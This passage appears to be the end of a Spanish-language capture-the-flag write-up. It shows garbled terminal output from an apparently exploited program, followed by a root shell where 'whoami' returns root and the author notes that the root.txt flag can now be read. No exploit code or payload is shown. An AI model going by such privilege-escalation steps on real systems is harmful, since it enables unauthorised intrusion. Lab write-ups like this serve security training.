          :3217394944: 6#: Assertion `' failed.
Syntax: Z
         $$D$
              <input string>
# whoami
root
#
```

A este punto ya somos el usuario **root** y podemos visualizar la flag (root.txt).
